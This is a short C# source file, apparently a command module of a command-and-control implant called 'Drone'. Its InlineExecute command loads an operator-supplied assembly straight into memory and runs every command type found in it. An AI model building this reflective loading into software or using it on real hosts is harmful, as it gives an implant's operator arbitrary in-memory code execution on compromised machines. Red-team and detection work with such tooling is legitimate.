using System;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

using Drone.Interfaces;
using Drone.Models;

namespace Drone.Commands;

public sealed class InlineExecute : DroneCommand
{
    public override byte Command => 0x12;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var asm = Assembly.Load(task.Artefact);

        foreach (var type in asm.GetTypes())
        {
            if (!typeof(IDroneCommand).IsAssignableFrom(type))
                continue;

            if (Activator.CreateInstance(type) is not IDroneCommand command)
                continue;
            
            command.Init(Drone);
            await command.Execute(task, cancellationToken);
        }
    }
}